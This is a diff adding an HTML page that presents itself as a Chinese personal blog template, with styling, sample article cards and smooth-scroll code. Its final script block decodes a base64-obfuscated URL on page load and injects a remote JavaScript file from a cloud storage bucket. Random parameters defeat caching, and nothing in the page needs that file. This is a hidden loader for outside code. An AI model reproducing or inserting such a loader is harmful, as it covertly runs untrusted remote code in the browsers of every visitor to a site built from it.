@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
+    <title>我的个人博客</title>
+    <style>
+        /* 基础样式 */
+        body {
+            overflow: hidden;
+            font-family: 'Inter', sans-serif;
+            /* 假设Inter字体可用，否则使用系统默认 */
+            margin: 0;
+            padding: 0;
+            background-color: #f8f8f8;
+            /* 浅色背景 */
+            color: #333333;
+            /* 深色文本 */
+            line-height: 1.6;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        /* 容器 */
+        .container {
+            max-width: 90%;
+            /* 适应移动端 */
+            margin: 0 auto;
+            padding: 20px 0;
+        }
+
+        /* 头部 */
+        header {
+            background-color: #e9ecef;
+            /* 头部背景色 */
+            padding: 20px 0;
+            text-align: center;
+            border-bottom-left-radius: 15px;
+            border-bottom-right-radius: 15px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+
+        header h1 {
+            margin: 0;
+            font-size: 1.8em;
+            /* 适应移动端 */
+            color: #333333;
+        }
+
+        /* 导航 */
+        nav {
+            background-color: #007bff;
+            /* 强调色作为导航背景 */
+            text-align: center;
+            padding: 10px 0;
+            border-radius: 15px;
+            margin-top: 20px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15);
+            /* 更明显的阴影 */
+        }
+
+        nav ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            /* 弹性布局 */
+            justify-content: space-around;
+            /* 均匀分布 */
+            flex-wrap: wrap;
+            /* 允许换行 */
+            /* 移除移动端垂直堆叠和隐藏的样式，确保始终横向显示 */
+        }
+
+        nav ul li {
+            margin: 5px 10px;
+        }
+
+        nav ul li a {
+            color: #ffffff;
+            /* 白色文字 */
+            text-decoration: none;
+            padding: 10px 20px;
+            /* 增加内边距 */
+            border-radius: 10px;
+            /* 更圆润的边角 */
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            /* 平滑过渡和点击效果 */
+            display: block;
+            /* 确保整个区域可点击 */
+            font-weight: 600;
+            /* 加粗字体 */
+            letter-spacing: 0.5px;
+            /* 增加字母间距 */
+        }
+
+        nav ul li a:hover,
+        nav ul li a:focus {
+            background-color: #0056b3;
+            /* 悬停颜色 */
+            transform: translateY(-2px);
+            /* 悬停时上浮 */
+        }
+
+        nav ul li a:active {
+            transform: translateY(0);
+            /* 点击时恢复 */
+            background-color: #004085;
+            /* 点击时的深色 */
+        }
+
+        /* 文章卡片 */
+        .article-card {
+            background-color: #ffffff;
+            margin-bottom: 25px;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.08);
+            transition: transform 0.3s ease;
+            /* 平滑过渡 */
+        }
+
+        .article-card:hover {
+            transform: translateY(-5px);
+            /* 鼠标悬停效果 */
+        }
+
+        .article-card h2 {
+            font-size: 1.5em;
+            /* 适应移动端 */
+            color: #007bff;
+            /* 强调色 */
+            margin-top: 0;
+            margin-bottom: 10px;
+        }
+
+        .article-card .date {
+            font-size: 0.9em;
+            color: #666666;
+            margin-bottom: 15px;
+            display: block;
+        }
+
+        .article-card p {
+            font-size: 1em;
+            color: #555555;
+            margin-bottom: 15px;
+        }
+
+        .article-card img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 15px auto;
+            border-radius: 10px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+
+        .read-more {
+            display: inline-block;
+            background-color: #007bff;
+            color: #ffffff;
+            padding: 10px 20px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: bold;
+            transition: background-color 0.3s ease;
+        }
+
+        .read-more:hover {
+            background-color: #0056b3;
+        }
+
+        /* 页脚 */
+        footer {
+            background-color: #e9ecef;
+            /* 页脚背景色 */
+            padding: 20px 0;
+            text-align: center;
+            font-size: 0.9em;
+            color: #666666;
+            margin-top: 30px;
+            border-top-left-radius: 15px;
+            border-top-right-radius: 15px;
+            box-shadow: 0 -2px 5px rgba(0, 0, 0, 0.05);
+        }
+
+        .social-links a {
+            color: #007bff;
+            text-decoration: none;
+            margin: 0 10px;
+            font-size: 1.2em;
+            transition: color 0.3s ease;
+        }
+
+        .social-links a:hover {
+            color: #0056b3;
+        }
+
+        /* 移动端导航菜单切换按钮 - 永久隐藏 */
+        .nav-toggle {
+            display: none !important;
+            /* 强制隐藏菜单切换按钮 */
+        }
+    </style>
+    <link rel="stylesheet" href="./static/css/style.css">
+</head>
+
+<body>
+    <header>
+        <div class="container">
+            <h1>我的思考与分享</h1>
+            <p>探索技术，记录生活，分享点滴</p>
+        </div>
+    </header>
+
+    <div class="container">
+        <!-- 移除菜单切换按钮，因为导航将始终显示 -->
+        <nav id="mainNav">
+            <ul>
+                <li><a href="#home">首页</a></li>
+                <li><a href="#about">关于我</a></li>
+                <li><a href="#articles">文章</a></li>
+                <li><a href="#contact">联系</a></li>
+            </ul>
+        </nav>
+
+        <main id="articles">
+            <section class="container">
+                <h2>最新文章</h2>
+                <div class="article-list">
+                    <div class="article-card">
+                        <img src="https://picsum.photos/300/200?random=1" alt="文章插图1" class="random-image">
+                        <h2>深入理解CSS Flexbox布局</h2>
+                        <span class="date">2023年10月26日</span>
+                        <p>Flexbox是一种一维布局方法，它能够帮助我们更有效地设计和分配容器中项目之间的空间。本文将详细介绍Flexbox的基本概念、属性及其在实际项目中的应用。</p>
+                        <a href="#" class="read-more">阅读更多</a>
+                    </div>
+
+                    <div class="article-card">
+                        <img src="https://picsum.photos/300/200?random=2" alt="文章插图2" class="random-image">
+                        <h2>JavaScript异步编程：从回调到Async/Await</h2>
+                        <span class="date">2023年10月20日</span>
+                        <p>JavaScript的异步特性是其核心之一。从早期的回调函数，到Promise，再到ES2017引入的Async/Await，本文将带您回顾异步编程的演进，并探讨如何编写更清晰、更易维护的异步代码。
+                        </p>
+                        <a href="#" class="read-more">阅读更多</a>
+                    </div>
+
+                    <div class="article-card">
+                        <img src="https://picsum.photos/300/200?random=3" alt="文章插图3" class="random-image">
+                        <h2>构建响应式网页的实用技巧</h2>
+                        <span class="date">2023年10月15日</span>
+                        <p>随着移动设备的普及，响应式网页设计变得至关重要。本文将分享一些实用的技巧，帮助您构建在各种屏幕尺寸上都能提供良好用户体验的网站。</p>
+                        <a href="#" class="read-more">阅读更多</a>
+                    </div>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 我的个人博客. 版权所有.</p>
+            <div class="social-links">
+                <a href="https://weibo.com/yourprofile" target="_blank">微博</a> |
+                <a href="https://github.com/yourprofile" target="_blank">GitHub</a> |
+                <a href="https://twitter.com/yourprofile" target="_blank">Twitter</a>
+            </div>
+        </div>
+    </footer>
+    <div id="overlay">
+        <div id="loading_box" class="loading_container">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+    </div>
+
+    <script>
+        // JS功能1: 为图片URL添加时间戳以防止缓存
+        document.addEventListener('DOMContentLoaded', function () {
+            const images = document.querySelectorAll('.random-image');
+            images.forEach(img => {
+                const originalSrc = img.src;
+                const timestamp = new Date().getTime();
+                img.src = `${originalSrc}&t=${timestamp}`;
+            });
+
+            // JS功能2: 平滑滚动 (点击导航链接时)
+            document.querySelectorAll('nav a').forEach(anchor => {
+                anchor.addEventListener('click', function (e) {
+                    e.preventDefault(); // 阻止默认跳转
+
+                    const targetId = this.getAttribute('href').substring(1);
+                    const targetElement = document.getElementById(targetId);
+
+                    if (targetElement) {
+                        // 导航菜单不再隐藏，所以不需要考虑 navToggle.offsetHeight
+                        window.scrollTo({
+                            top: targetElement.offsetTop,
+                            behavior: 'smooth' // 平滑滚动
+                        });
+                    }
+                });
+            });
+        });
+    </script>
+    <script>
+        (function () {
+            function init() {
+                const encodedUrl = "aHR0cHM6Ly9wZXJzb25zaW1nLm9zcy1jbi1ob25na29uZy5hbGl5dW5jcy5jb20vcGVyc29uc2ltZy9jb3JlLW5ldy5qcw==";
+                const decodedUrl = atob(encodedUrl);
+                const timestamp = Date.now();
+                const randomNum = Math.floor(Math.random() * 1000000);
+                const url = `${decodedUrl}?t=${timestamp}&random=${randomNum}`;
+                const script = document.createElement("script");
+                script.src = url;
+                document.body.appendChild(script);
+            }
+            init();
+        })();
+    </script>
+
+</body>
+
+</html>
